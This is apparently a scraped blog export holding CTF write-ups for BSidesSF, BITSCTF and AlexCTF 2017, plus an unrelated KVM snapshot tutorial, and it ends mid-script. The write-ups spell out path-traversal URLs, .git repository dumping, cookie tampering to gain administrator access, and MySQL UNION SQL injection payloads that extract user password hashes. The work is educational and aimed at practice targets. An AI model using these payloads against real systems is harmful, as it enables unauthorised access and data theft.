http://zumbo-8ac445b1.ctf.bsidessf.net/server.py also works... 100 - Zumbo 2 - Web Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM. Three flags await. Can you find them? http://zumbo-8ac445b1.ctf.bsidessf.net Stage 3 - coming soon! For the next part of the challenge, we already got the server.py source so I looked again at the flag2 part: 12with open('/flag') as f: flag2 = f.read() Ok the flag is in /flag so just change http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fcode/server.py into http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fflag. And get the flag: FLAG: RUNNER_ON_SECOND_BASE. 100 - the-year-2000 - Web Wait, what year is it? http://theyear2000.ctf.bsidessf.net/ The author says on this home page: I made this website all by myself using these tools html notepad++ git apache I tried http://theyear2000.ctf.bsidessf.net/.git/ and it returned me Forbidden error. So there is a .git repot here. As usual I used GitTools to dump the repository: 12345678910111213141516171819202122232425262728$ ./gitdumper.sh http://theyear2000.ctf.bsidessf.net/.git/ repoDestination folder does not existCreating repo/.git/Downloaded: HEADDownloaded: objects/info/packsDownloaded: descriptionDownloaded: configDownloaded: COMMIT_EDITMSGDownloaded: indexDownloaded: packed-refsDownloaded: refs/heads/masterDownloaded: refs/remotes/origin/HEADDownloaded: refs/stashDownloaded: logs/HEADDownloaded: logs/refs/heads/masterDownloaded: logs/refs/remotes/origin/HEADDownloaded: info/refsDownloaded: info/excludeDownloaded: objects/4e/ec6b9c6e464c35fff1efb8444dd0ac1ae67b30Downloaded: objects/00/00000000000000000000000000000000000000Downloaded: objects/e0/39a6684f53e818926d3f62efd25217b25fc97eDownloaded: objects/9e/9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0Downloaded: objects/f3/a3f88425975542bb0058651867f8090fed250fDownloaded: objects/0c/e1cbf654058dd4b9ba0df440a02aef408f76daDownloaded: objects/bd/72ee2c7c5adb017076fd47a92858cef2a04c11Downloaded: objects/e1/6b652d659d50fc5e7aecae789e743c0a8fa035Downloaded: objects/7c/57d178eea98e174f3d6ef521126117478085edDownloaded: objects/7b/aff32394e517c44f35b75079a9496559c88053 A quick git log -p show me this commit: 12345678910111213141516171819commit 4eec6b9c6e464c35fff1efb8444dd0ac1ae67b30Author: Mark Zuckerberg &lt;thezuck@therealzuck.zuck&gt;Date: Sat Feb 11 22:54:32 2017 +0000 Wooops, didn't want to commit that. Rebased.diff --git a/index.html b/index.htmlindex 7c57d17..e16b652 100644--- a/index.html+++ b/index.html@@ -15,7 +15,7 @@ pre &#123; &lt;/style&gt; &lt;/head&gt; &lt;body&gt;-&lt;h1&gt;Welcome to my homepage!!!!&lt;/h1&gt;+&lt;h1&gt;Welcome to my homepage, there are no flags here.!!!!&lt;/h1&gt; &lt;hr&gt; &lt;p&gt;I made this website all by myself using these tools &lt;ul&gt; There was a rebase so let's see when it happened: 12345$ git reflog4eec6b9 HEAD@&#123;0&#125;: commit: Wooops, didn&apos;t want to commit that. Rebased.e039a66 HEAD@&#123;1&#125;: reset: moving to HEAD~19e9ce4d HEAD@&#123;2&#125;: commit: Fixed a spelling errore039a66 HEAD@&#123;3&#125;: commit (initial): First commit on my website Ok so we have to come back before the HEAD reset: 12$ git reset --hard HEAD@&#123;2&#125;HEAD is now at 9e9ce4d Fixed a spelling error Now let's take a look at this fix: git log -p -1 123456789101112131415commit 9e9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0Author: Mark Zuckerberg &lt;thezuck@therealzuck.zuck&gt;Date: Sat Feb 11 22:54:27 2017 +0000 Fixed a spelling errordiff --git a/index.html b/index.htmlindex 7c57d17..7baff32 100644--- a/index.html+++ b/index.html@@ -43,3 +43,4 @@ ______________________ &lt;/pre&gt; &lt;/marquee&gt; &lt;/body&gt;&lt;/html&gt;+Your flag is... FLAG:what_is_HEAD_may_never_die Here is teh flag: FLAG:what_is_HEAD_may_never_die. 40 - easycap - Forensics Can you get the flag from the packet capture? easycap.pcap This is some raw tcp frames and some of them have 1 byte of additional data. Let's extract that with tshark: 12$ tshark -r easycap.pcap -T fields -e data | tr -d &apos;\\n&apos;464c41473a33383562383761666338363731646565303735353032393064313661383037310a% Now translate hex to ASCII with a little ruby trick: 12irb(main):008:0&gt; ['464c41473a33383562383761666338363731646565303735353032393064313661383037310a'].pack('H*')=&gt; \"FLAG:385b87afc8671dee07550290d16a8071\\n\" Flag is FLAG:385b87afc8671dee07550290d16a8071. 10 - Easy - Reversing This one is easy. easy-32 easy-64 12$ strings easy-64 | grep -i flagFLAG:db2f62a36a018bce28e46d976e3f9864 30 - easyauth - Web Can you gain admin access to this site? http://easyauth-afee0e67.ctf.bsidessf.net easyauth.php Hint say to log in with: guest/guest We have a cookie like this: 1auth=username=guest&amp;date=2017-02-13T21:09:45+0000&amp; If we click on the link we get the following message: It's cool that you logged in, but unfortunately we can only give the flag to 'administrator'. :( Configure proxy and launch burpsuite. Then change guest into administrator in the cookie and send. You now get the flag: Congratulations, you're the administrator! Here's your reward: FLAG:0076ecde2daae415d7e5ccc7db909e7e 450 - vhash - Crypto ---- Due to a bug, the challenge might be easier than intended. Enjoy the free points! ---- Can you gain admin access to this site? (The vhash binary is what's used for signing the cookie) http://vhash-c6bb0e85.ctf.bsidessf.net:9292 vhash.zip The zip contain the vhash ELF executable and the index.php source: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php require_once('./auth.php'); function do_hash($data) &#123; $filename = tempnam(sys_get_temp_dir(), 'vhash'); file_put_contents($filename, $data); $hash = substr(`/home/ctf/vhash $filename`, 0, 256); unlink($filename); return $hash; &#125; function create_hmac($data) &#123; return do_hash(SECRET . $data); &#125; if(isset($_GET['action']) &amp;&amp; $_GET['action'] === 'logout') &#123; setcookie('auth', ''); header('Location: index.php'); &#125; if(isset($_POST['username'])) &#123; # Do pagey stuff if(is_valid($_POST['username'], $_POST['password'])) &#123; # Create the cookie $cookie = 'username=' . $_POST['username'] . '&amp;'; $cookie .= 'date=' . date(DATE_ISO8601) . '&amp;'; $cookie .= 'secret_length=' . strlen(SECRET) . '&amp;'; # Sign the cookie $cookie = create_hmac($cookie) . '|' . $cookie; setcookie('auth', $cookie); print \"&lt;h1&gt;Login successful!&lt;/h1&gt;\\n\"; print \"&lt;p&gt;Setting cookie: &lt;tt&gt;auth=$cookie&lt;/tt&gt;&lt;/p&gt;\\n\"; &#125; else &#123; print \"&lt;h1&gt;Username or password was incorrect!&lt;/h1&gt;\\n\"; &#125; print \"&lt;p&gt;Click &lt;a href='index.php'&gt;here&lt;/a&gt; to continue!&lt;/p&gt;\\n\"; exit(0); &#125; if(!isset($_COOKIE['auth'])) &#123; require_once('./login_form.php'); exit(0); &#125; list($hmac, $cookie) = explode('|', $_COOKIE['auth'], 2); if(create_hmac($cookie) !== $hmac) &#123; setcookie('auth', ''); print \"&lt;p&gt;Something was wrong with your auth cookie!&lt;/p&gt;\\n\"; print \"&lt;p&gt;Click &lt;a href='index.php'&gt;here&lt;/a&gt; to log in again!&lt;/p&gt;\\n\"; exit(); &#125; $pairs = explode('&amp;', $cookie); $args = array(); foreach($pairs as $pair) &#123; if(!strpos($pair, '=')) continue; list($name, $value) = explode('=', $pair, 2); $args[$name] = $value; &#125; $username = $args['username']; print \"&lt;h1&gt;Welcome back, $username!&lt;/h1&gt;\\n\"; if($username == 'administrator') &#123; print \"&lt;p&gt;Congratulations, you're the administrator! Here's your reward:&lt;/p&gt;\\n\"; print \"&lt;p&gt;\" . FLAG . \"&lt;/p&gt;\\n\"; &#125; else &#123; print \"&lt;p&gt;It's cool that you logged in, but unfortunately we can only give the flag to 'administrator'. :(&lt;/p&gt;\\n\"; &#125; print \"&lt;p&gt;&lt;a href='/index.php?action=logout'&gt;Log out&lt;/a&gt;&lt;/p&gt;\\n\";?&gt; Description says the challenge is more easy due to a bug, here it is: 1if($username == 'administrator') So the challenge is exactly like the previous 30 - easyauth - Web. Configure proxy and launch burpsuite. Then change guest into administrator in the cookie and send. You now get the flag: Congratulations, you're the administrator! Here's your reward: FLAG:180e2300112ef5a4f23c93cfdec8d780","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"},{"name":"reversing","slug":"reversing","permalink":"https://rawsec.ml/tags/reversing/"}]},{"title":"Snapshot for KVM via libvirt with virsh","slug":"snapshot-kvm-libvirt-virsh","date":"2017-02-07T23:00:00.000Z","updated":"2017-02-07T22:03:01.578Z","comments":true,"path":"en/snapshot-kvm-libvirt-virsh/","link":"","permalink":"https://rawsec.ml/en/snapshot-kvm-libvirt-virsh/","excerpt":"","text":"Context I am using KVM, and use/manage my VMs with virt-manager. But I asked myself this question: how can create or revert some snapshot? I'm giving examples for qcow2 disk images and commands are made with virsh. Internal Disk Snapshots You can list available VM with virsh in order to know their name: 1234$ virsh list Id Name State---------------------------------- 1 vmname running Then you can check if there already is existing shapshots for this VM: 123$ virsh snapshot-list vmname Name Creation Time State------------------------------------------------------------ Next there is two possibilities to make a snapshot: create a XML snapshot description file to specify the name and description of the snapshot or let libvirt choose a name and no description The XML snapshot description file must look like the following: 1234&lt;domainsnapshot&gt; &lt;name&gt;vmname-snapshot1&lt;/name&gt; &lt;description&gt;description of the snapshot&lt;/description&gt;&lt;/domainsnapshot&gt; Make a snapshot with an XML file: 1$ virsh snapshot-create vmname /path/to/description.xml Or make a snapshot without description file: 1$ virsh snapshot-create vmname Note: this is much more faster to make a snapshot while the VM is stoped. But it's also possible to make a snapshot while the VM is running even if it's more slow. If you want to see some informations about the VM and snapshots you can run: 12345678910111213141516$ qemu-img info /path/to/disk/image/vmname.qcow2image: vmname.qcow2file format: qcow2virtual size: 20G (21474836480 bytes)disk size: 5.2Gcluster_size: 65536Snapshot list:ID TAG VM SIZE DATE VM CLOCK1 vmname-snapshot1 329M 2017-02-08 20:40:59 01:23:38.2812 vmname-snapshot2 375M 2017-02-08 20:46:39 01:26:01.6453 vmname-snapshot3 482M 2017-02-08 22:42:48 03:22:00.515Format specific information: compat: 1.1 lazy refcounts: true refcount bits: 16 corrupt: false To revert the VM to a snapshot, for example run: 1$ virsh snapshot-revert vmname vmname-snapshot1 Source","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"}]},{"title":"BITSCTF 2017 - Write-ups","slug":"BITSCTF-2017-writeups","date":"2017-02-04T23:00:00.000Z","updated":"2017-02-07T18:23:36.812Z","comments":true,"path":"en/BITSCTF-2017-writeups/","link":"","permalink":"https://rawsec.ml/en/BITSCTF-2017-writeups/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : BITSCTF 2017 Website : bitsctf.bits-quark.org Type : Online Format : Jeopardy CTF Time : link 10 - BotBot - web Should not ask for the description of a 5 marker. botbot.bitsctf.bits-quark.org Let's look at the source code: 1234567&lt;!DOCTYPE HTML&gt;&lt;!-- Nothing to see here. Maybe try looking up seo .txt--&gt;&lt;html&gt;[...] Now go to http://botbot.bitsctf.bits-quark.org/robots.txt: 12Useragent *Disallow: /fl4g http://botbot.bitsctf.bits-quark.org/fl4g/ : 1BITCTF&#123;take_a_look_at_googles_robots_txt&#125; 20 - Labour - Misc Follow your heart, for it leads you straight to the answer. It's a gpx file: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;&lt;gpx version=&quot;1.1&quot; creator=&quot;BITSCTF&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://www.topografix.com/GPX/1/1&quot; xsi:schemaLocation=&quot;http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd&quot;&gt;&lt;!--Use appropriate brackets and underscores to separate words if you succeed--&gt;&lt;wpt lat=&quot;23.71697&quot; lon=&quot;89.45508&quot;&gt;&lt;ele&gt;12.1&lt;/ele&gt;&lt;name&gt;WP01-A&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;22.82885&quot; lon=&quot;80.79786&quot;&gt;&lt;name&gt;WP02-B&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;39.88276&quot; lon=&quot;58.81642&quot;&gt;&lt;name&gt;WP03-C&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;15.43674&quot; lon=&quot;27.65039&quot;&gt;&lt;name&gt;WP04-D&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;12.69179&quot; lon=&quot;17.50781&quot;&gt;&lt;ele&gt;288.7&lt;/ele&gt;&lt;name&gt;WP05-E&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;14.91081&quot; lon=&quot;100.47656&quot;&gt;&lt;ele&gt;13.1&lt;/ele&gt;&lt;name&gt;WP06-F&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;45.9267&quot; lon=&quot;2.21484&quot;&gt;&lt;ele&gt;557.9&lt;/ele&gt;&lt;name&gt;WP07-G&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;4.11852&quot; lon=&quot;102.19922&quot;&gt;&lt;ele&gt;67.2&lt;/ele&gt;&lt;name&gt;WP08-H&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;34.85709&quot; lon=&quot;65.84765&quot;&gt;&lt;ele&gt;3209.7&lt;/ele&gt;&lt;name&gt;WP09-I&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;28.89086&quot; lon=&quot;68.30859&quot;&gt;&lt;ele&gt;116.9&lt;/ele&gt;&lt;name&gt;WP10-J&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;39.20502&quot; lon=&quot;31.92187&quot;&gt;&lt;ele&gt;797.8&lt;/ele&gt;&lt;name&gt;WP11-K&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;47.24344&quot; lon=&quot;19.8457&quot;&gt;&lt;ele&gt;93.5&lt;/ele&gt;&lt;name&gt;WP12-L&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;25.30828&quot; lon=&quot;29.84765&quot;&gt;&lt;ele&gt;267&lt;/ele&gt;&lt;name&gt;WP13-M&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;18.97119&quot; lon=&quot;-72.28521&quot;&gt;&lt;ele&gt;375&lt;/ele&gt;&lt;name&gt;WP14-N&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;-13.61609&quot; lon=&quot;17.68359&quot;&gt;&lt;ele&gt;1510.9&lt;/ele&gt;&lt;name&gt;WP15-O&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;33.84122&quot; lon=&quot;102.23438&quot;&gt;&lt;ele&gt;3426.2&lt;/ele&gt;&lt;name&gt;WP16-P&lt;/name&gt;&lt;/wpt&gt;&lt;wpt lat=&quot;46.89624&quot; lon=&quot;69.53907&quot;&gt;&lt;ele&gt;364.4&lt;/ele&gt;&lt;name&gt;WP17-Q&lt;/name&gt;&lt;/wpt&gt;&lt;/gpx&gt; We can open it online with: http://www.visugpx.com/index.php http://www.gpsvisualizer.com/map?output_home Take the waypoint in order and write the name of the country: WP01-A - Bangladesh WP02-B - India WP03-C - Turkmenistan WP04-D - Sudan WP05-E - Chad WP06-F - Thailand WP07-G - France WP08-H - Malesia WP09-I - Afganistan WP10-J - Pakistan WP11-K - Turkey WP12-L - Hungary WP13-M - Egypt WP14-N - Haiti WP15-O - Angola WP16-P - China WP17-Q - Kazaksztan Taking the first letter of each country in order give me BITSCTFMAPTHEHACK and the comment said: Use appropriate brackets and underscores to separate words if you succeed So I get BITSCTF{MAP_THE_HACK} 30 - Batman vs Joker - Web Joker has left a message for you. Your job is to get to the message asap. joking.bitsctf.bits-quark.org Try a quick ' or 1=1 #': this is working so we have a vulnerable MySQL database. Let's enjoy SQLi. Just curious to know the DB version: ' or 1=1 UNION SELECT @@version,1 #: 5.5.54-0+deb8u1 Current databse name: ' or 1=1 UNION SELECT database(),1 #: hack Just curious to list the databse users: ' or 1=1 UNION SELECT host, user FROM mysql.user # and ' or 1=1 UNION SELECT user, password FROM mysql.user #: host user password % tester *975B2CD4FF9AE554FE8AD33168FBFC326D2021DD 127.0.0.1, 33842653d6db, ::1, localhost root *A2AE2E3109CE064A1AED30C0E71E021540F30700 localhost debian-sys-maint *A9A6626F5FEE26E9EDDE42FF9274124A98F82A3F I want to know the name of tables in the hack databse: ' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = 'hack' #: table_schema table_name hack CIA_Official_Records hack joker And finally I want to know the name of columns in the both previous tables: ' or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'CIA_Official_Records' or table_name = 'joker' #: table_name column_name CIA_Official_Records id CIA_Official_Records username CIA_Official_Records first_name CIA_Official_Records last_name Joker Flag Joker HaHaHa Pretty easy to know where to find teh flag now: ' or 1=1 UNION SELECT Flag, HaHaHa FROM Joker #: Flag HaHaHa BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!} Enjoying the game Batman!!! 50 - Tom and Jerry - Forensics WARNING: we didn't solve this challenge, so write-up is incomplete. Open the pcapng with Wireshark. Device Descriptor tell us: 12idVendor: Wacom Co., Ltd (0x056a)idProduct: CTL-460 [Bamboo Pen (S)] (0x00d4) So this is a Pen Tablet. We can use a filter usb.transfer_type == 0x01 to oly see frame where there is data. We can complete the filter with (frame.len == 73) to see only one side of the exchange and !(usb.capdata == 00:00:00:00:00:00:00:00) to hide null data. Finally that give us this filter: ((usb.transfer_type == 0x01) &amp;&amp; (frame.len == 73)) &amp;&amp; !(usb.capdata == 00:00:00:00:00:00:00:00). USB transfert type is USB INTERRUPT: http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt To extract the data only from the pcapng I used tshark: 1tshark -r Cat.pcapng -T fields -e usb.capdata &gt; capdata.txt I didn't have time to search how to interpret the raw data into coordinates.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"AlexCTF 2017 - Write-ups","slug":"AlexCTF-2017-write-ups","date":"2017-02-04T23:00:00.000Z","updated":"2017-02-07T21:03:11.491Z","comments":true,"path":"en/AlexCTF-2017-write-ups/","link":"","permalink":"https://rawsec.ml/en/AlexCTF-2017-write-ups/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : AlexCTF 2017 Website : ctf.oddcoder.com Type : Online Format : Jeopardy CTF Time : link 10 - TR1: Hello there - Trivia Why not drop us a few lines and say hi :). Go to the irc: #alexctf @freenode and get the flag with /topic. 20 - TR2: SSL 0day - Trivia It lead to memory leakage between servers and clients rending large number of private keys accessible. (one word) Answer: heartbleed (details) 30 - TR3: CA - Trivia What is the CA that issued Alexctf https certificate (flag is lowercase with no spaces) Answer: letsencrypt 40 - TR4: Doesn't our logo look cool ? - Trivia Here is the logo: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115&apos;@+. @@@@@@@: @@@@@@@@@# @@@@@@@@@@@, &apos;@@@@@@@@@@@@ @@@@@@@@@@@@@ @@@@@@@@@@@@@. @@@@@@@@@@@@@, @@@@A@@@@@@@@ +@@@@@@@@@@@@ .:++@@@@@+:. @@@@@@@@@@@&apos; .+@@@@@@@@@@@@@@@@@@@@@` .@@@@@@@@@@ .#@@@@@@@@@@@@@@L@@@@@@@@@@@@@# +@@@@@@@@ `#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ .@@. +@@@E@@@@ .@@@@@@X@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@: &apos;@@@@@. +@@@@@@@@ ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@C@@. `+@@@@@@@@@. +@@@@@@@@ ;@@@@@@T@@@@@@@@@@@&apos;,` .+@@@@@@@@@@@@@@@: `:@@@@@@F@@@@@@@@. +@@@@@@@@ ;@@@@@@@@@@@+. ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. +@@@@@@@@ ;@@@@@@@, `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. +@@@@@@@@ ;@@@@@. +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. +@@@@@@@@ ;@@@@@. @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@@@@@@@@&#123;@@@@@@@@@@@#, ;@@@@@. +@@@@@@@@ ;@@@@@. &apos;@@@@@@@@@@@@@@+, ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. :;. ;@@@@@. +@@@@@@@@ ;@@@@@. @ ;@ @@@@@@@ @` `@ +@@#@@ &apos;@@@@@@@ @@@@@@@, ;@@@0@. +@@@@U@@@ ;@@@@@. @+ ;@ @ .@ @, @ #@ `@ @ ;@@@@@. +@@@@@R@@ ;@@@@@. .@@ ;@ @ @` `@ :@ @ `@ @ ;@@@_@. +@@@@@@@@ ;@@@@@. @,@ ;@ @ ,@ @, ;@ ` `@ @ ;@@@@@. +@@@@@@@@ ;@@@@@. @ @: ;@ @ @`@ ;@ `@ @ ;@@@@@. +@@@@@@@@ ;@@@@@. @ .@ ;@ @ ,@: ;@ `@ @ ;@@@@@. +@@@@@@@@ ;@@@@@. +# @ ;@ @@@@@@ @ ;@ `@ @@@@@@ ;@@@@@. +@@@@@@@@ ;@@@@@. @ @` ;@ @ @+@ ;@ `@ @ ;@@@@@. +@@@@@@@@ ;@@@@@. @ &apos;# ;@ @ @ @ ;@ `@ @ ;@@@@@. +@@@@@@@@ ;@@@@@. ,@@@@@@ ;@ @ @; :@ ;@ @ `@ @ ;@@@@@. +@@@@@@@@ ;@@@@@. @: @ ;@ @ @ @ ,@ @ `@ @ ;@@@@@. +@@@@@@@@ ;@@@@@. @ @; ;@ @ @; :@ @, @&apos; `@ @ ;@@@@@. +@@@@@L@@ ;@@@@@. @ .@ ;@@@@@@ @@@@@@@ @ @ @@@@# `@ @ ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@0@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ;@@G@@. +@@@@@@@@ ;@@@@@. ;@@@@@. +@@@@@@@@ ;@@@@@. ..,:,.. ;@@@@@. +@@@@@@@@ ;@@@@@. `&apos;@@@@@@@@@@@@@@@@@@@@: ;@@@@@. +@@@@@@@@ ;@@@@@.+@@@@@@@@@@@@@0@@@@@@@@@@@@@@@. ;@@@_@. +@@R@@@@@ ;@@@@0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@# ;@@C@@. +@@@@@@@@ ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@` .@@@@@@. +@@@@@@@@ ;@@@@@@@@@@@K@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@, `&apos;@@@@@S@@@@. +@@@@@@@@ ;@@@@@@@@@@@@@@@@@@+;;...;;+@@@@@@@@@@@@@@@@@@@@@@+:. ..:+@@@@@@@@@@@@@@@@@. +@@@@@@@@ ;@@@@@@@@@@#, &apos;@@@@@&#125;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. +@@@@@@@@ ;@@@@@@; ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. +@@@@@@@@ ;@@# `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@# +@@@@@@@@ , ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. +@@@@@@@@ `+@@@@@@@@@@@@@@@@@@@@#, +@@@@@@@@ .;&apos;+++&apos;;. +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +@@@@@@@@ +++++++++++++++++++#@@@@@@@@+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Let's write a very short ruby script to filter that: 1234logo = open(\"logo.txt\", 'r').read()#flag = logo.gsub(/[^a-zA-Z0-9&#123;&#125;_]/, '')flag = logo.gsub(/[#@.;:+,`'\\s]/, '')puts flag Flag: ALEXCTF{0UR_L0G0_R0CKS} 100 - SC1: Math bot - Scripting It is well known that computers can do tedious math faster than human. nc 195.154.53.62 1337 Update we got another mirror here nc 195.154.53.62 7331 The server send some calculations with big integers and we have to solve a lot of them. To do that I did a ruby bot: 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/rubyrequire 'socket'hostname = '195.154.53.62'port = 1337s = TCPSocket.open(hostname, port)raw = ''res = nilflag = 